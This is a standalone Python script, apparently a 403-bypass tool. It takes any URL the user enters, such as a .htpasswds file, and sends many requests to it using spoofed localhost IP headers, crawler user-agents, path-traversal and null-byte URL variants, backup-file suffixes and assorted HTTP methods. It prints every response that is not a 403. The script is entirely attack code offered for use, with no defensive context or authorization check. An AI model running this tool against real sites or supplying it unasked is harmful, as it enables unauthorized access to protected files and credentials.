import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# Function to make HTTP requests
def send_request(method, url, headers):
    try:
        response = requests.request(method, url, headers=headers, timeout=10)
        return (url, method, headers, response.status_code, response.text)
    except requests.exceptions.Timeout:
        return (url, method, headers, "Timeout", "")
    except requests.exceptions.ConnectionError:
        return (url, method, headers, "Connection Error", "")
    except requests.RequestException as e:
        return (url, method, headers, f"Error: {e}", "")

# Main function
def main():
    full_url = input("Enter the full URL to the forbidden resource (e.g., https://example.com/.htpasswds): ").strip()
    url_parts = full_url.split('/')
    domain = url_parts[2]
    resource = '/'.join(url_parts[3:])
    base_url = f'https://{domain}/'

    # Base headers to be updated dynamically
    base_headers = {
        'User-Agent': 'Mozilla/5.0',
        'Referer': f'https://{domain}',
        'X-Forwarded-For': '127.0.0.1'
    }

    # Expanded headers list (headers to update dynamically)
    additional_headers = [
        {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'},
        {'X-Forwarded-For': '10.10.10.10'},
        {'X-Originating-IP': '127.0.0.1'},
        {'X-Remote-IP': '127.0.0.1'},
        {'X-Remote-Addr': '127.0.0.1'},
        {'Forwarded': 'for=127.0.0.1'},
        {'True-Client-IP': '127.0.0.1'},
        {'User-Agent': 'Baiduspider'},
        {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'},
        {'User-Agent': 'curl/7.68.0'},
    ]

    # Expanded URL variations
    url_variations = [
        full_url,
        base_url + '%2e' + resource,
        base_url + '.' + resource,
        base_url + './' + resource,
        base_url + '/../' + resource,
        full_url + '%00',
        full_url + '/',
        full_url + '.bak',
        full_url + '.old',
        full_url.replace(resource, resource.replace('/', '%2F')),
        base_url + resource.replace('.', '%2e'),
        full_url + '?id=1',
        full_url + '?admin=true',
        full_url + '?debug=true',
        base_url + resource + '?anything=here',
        full_url.replace('https://', 'http://'),
        base_url + '//' + resource,
        base_url + '/%2e%2e%2f%2e%2e%2f' + resource,
        base_url + resource + '%20',
        base_url + resource + '/%20',
    ]

    # HTTP methods to test
    methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD', 'TRACE']

    # Use ThreadPoolExecutor for parallel requests
    with ThreadPoolExecutor(max_workers=5) as executor:
        future_to_request = []

        # Generate all the combinations of methods, headers, and URLs
        for method in methods:
            for headers in additional_headers:
                for test_url in url_variations:
                    # Merge base headers with current test headers
                    current_headers = {**base_headers, **headers}
                    future = executor.submit(send_request, method, test_url, current_headers)
                    future_to_request.append(future)
        
        # Process the completed requests as they finish
        for future in as_completed(future_to_request):
            url, method, headers, status_code, content = future.result()
            print(f'{method} {url} -> Status Code: {status_code}')
            if status_code != 403:
                print(f'Response Content: {content[:200]}...')  # Limit output for readability
            time.sleep(0.5)  # Control rate limiting

if __name__ == "__main__":
    main()
